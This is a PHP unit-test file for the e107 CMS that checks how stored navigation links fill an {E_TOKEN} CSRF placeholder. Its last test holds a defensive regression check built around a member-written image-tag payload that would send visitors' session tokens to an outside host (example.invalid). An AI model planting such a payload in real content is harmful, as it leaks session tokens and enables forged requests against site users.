<?php

/**
 * A sitelink URL is stored as data, so there is no moment at which PHP could put the
 * session's CSRF token into it. {E_TOKEN} is the placeholder an administrator writes
 * instead, and the renderers of a stored link URL are the only things that fill it.
 *
 * @see sitelinks::fillToken()
 */
class sitelinksFillTokenTest extends \Codeception\Test\Unit
{
	use \Test\BootedCli;

	/**
	 * Stands in for the token e_core_session::check() mints, which no CLI request
	 * ever reaches.
	 */
	const TOKEN = 'e107t0ken0123456789abcdef0123456';

	/** The replacement an administrator is told to write into a logout link. */
	const STORED_URL = 'index.php?logout&e-token={E_TOKEN}';

	/**
	 * A row of the shape Admin Area » Settings » Navigation stores.
	 *
	 * @return array
	 */
	private static function linkRow()
	{
		return array(
			'link_id'          => 1,
			'link_name'        => 'Logout',
			'link_url'         => self::STORED_URL,
			'link_description' => '',
			'link_button'      => '',
			'link_category'    => 1,
			'link_parent'      => 0,
			'link_open'        => 0,
			'link_class'       => 0,
			'link_order'       => 1,
			'link_function'    => '',
			'link_sefurl'      => '',
			'link_owner'       => '',
		);
	}

	/**
	 * Runs $php in a booted CLI process that holds a token, and returns whatever it
	 * printed between the two markers.
	 *
	 * @param string $php ends by echoing '@@'.$answer.'@@'
	 * @return string
	 */
	private function withToken($php)
	{
		list($output, $status) = $this->runInBootedCli("define('e_TOKEN', '".self::TOKEN."'); ".$php);

		$printed = implode("\n", $output);
		$matches = array();

		self::assertSame(0, $status, "the probe exited ".$status.":\n".$printed);
		self::assertSame(1, preg_match('/@@(.*)@@/s', $printed, $matches), "the probe printed no answer:\n".$printed);

		return $matches[1];
	}

	public function testTheStoredPlaceholderBecomesTheToken()
	{
		self::assertSame('index.php?logout&e-token='.self::TOKEN,
			$this->withToken("echo '@@'.sitelinks::fillToken('".self::STORED_URL."').'@@';"));
	}

	/**
	 * The placeholder is published as a class constant, so a caller that builds a stored
	 * URL names it instead of repeating the literal.
	 */
	public function testTheConstantSpellsThePlaceholderThatIsFilled()
	{
		self::assertSame(self::STORED_URL, 'index.php?logout&e-token='.sitelinks::TOKEN_PLACEHOLDER);
	}

	/**
	 * An install below SECURITY_LEVEL_LOW mints no token and refuses no logout, so
	 * the link it publishes has to keep working with nothing in it.
	 */
	public function testThePlaceholderEmptiesWhereNoTokenIsMinted()
	{
		self::assertSame('index.php?logout&e-token=', sitelinks::fillToken(self::STORED_URL));
	}

	public function testANavigationLinkCarriesTheTokenInItsUrl()
	{
		$url = $this->withToken('$row = '.var_export(self::linkRow(), true).'; '
			."echo '@@'.e107::getScBatch('navigation')->setVars(\$row)->sc_nav_link_url().'@@';");

		self::assertStringContainsString('e-token='.self::TOKEN, $url, 'the stored placeholder has to reach the href as a token');
		self::assertStringNotContainsString('{E_TOKEN}', $url);
		self::assertStringStartsWith('http', $url, 'a navigation URL is published absolute');
	}

	public function testASitelinkCarriesTheTokenInItsHref()
	{
		$markup = $this->withToken('$GLOBALS[\'tp\'] = e107::getParser(); '
			.'$row = '.var_export(self::linkRow(), true).'; '
			."echo '@@'.e107::getSitelinks()->makeLink(\$row, false, array('linkstart' => '', 'linkclass' => '', 'linkend' => '')).'@@';");

		self::assertStringContainsString('e-token='.self::TOKEN, $markup, 'the legacy renderer fills a stored URL too');
		self::assertStringNotContainsString('{E_TOKEN}', $markup);
	}

	/**
	 * The legacy {SITELINKS_ALT} navigation renders the same stored rows through its
	 * own pair of helpers, so it fills the placeholder too.
	 */
	public function testTheAlternateNavigationCarriesTheTokenInItsHref()
	{
		$markup = $this->withToken("require_once(e_CORE.'shortcodes/single/sitelinks_alt.php'); "
			."echo '@@'.sitelinks_alt::adnav_cat('Logout', '"
			.self::STORED_URL."', 'no_icons').'|'.sitelinks_alt::adnav_main('Logout', '"
			.self::STORED_URL."', 'no_icons').'@@';");

		self::assertStringContainsString('e-token='.self::TOKEN.'\'', $markup, 'the category anchor has to carry the token');
		self::assertSame(2, substr_count($markup, 'e-token='.self::TOKEN), 'both helpers publish an href');
		self::assertStringNotContainsString('{E_TOKEN}', $markup);
	}

	/**
	 * The reason the fill lives in the stored-URL resolvers and not in a shortcode.
	 * BODY parses shortcodes and leaves link_click on, and core renders an approved
	 * submitted-news body in it, so a member who writes this image tag would hand
	 * every later visitor's live token to a third party on page view.
	 */
	public function testAMemberWrittenImageTagNeverCarriesTheToken()
	{
		$payload = '[img]http://example.invalid/?t={E_TOKEN}[/img]';

		$rendered = $this->withToken('$tp = e107::getParser(); '
			."echo '@@'.\$tp->toHTML(\$tp->toDB('".$payload."'), true, 'BODY').'@@';");

		self::assertStringContainsString('example.invalid/?t=', $rendered,
			'the payload has to reach the page, or this proves nothing');
		self::assertStringNotContainsString(self::TOKEN, $rendered,
			'a context that parses shortcodes handed a member the session token');
	}
}
